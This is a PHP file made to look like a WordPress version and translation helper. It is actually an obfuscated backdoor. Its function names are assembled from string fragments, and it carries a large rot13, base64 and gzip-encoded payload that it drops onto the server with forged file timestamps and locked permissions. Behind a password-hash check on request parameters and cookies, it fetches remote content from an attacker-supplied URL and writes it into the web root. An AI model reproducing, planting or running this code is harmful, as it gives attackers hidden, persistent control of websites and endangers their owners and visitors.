<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y3Mupv93q3pinUEgoP93pP1wo250MJ50Y2kuozq1LJqypl9uMT1cov1gLJyhYH5nYaOi', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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', '1');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '0');
        $data = translation_v1($data, '1');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("spw{$check}wcg", 'd32e380330f6214c513e87ca106c483b')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}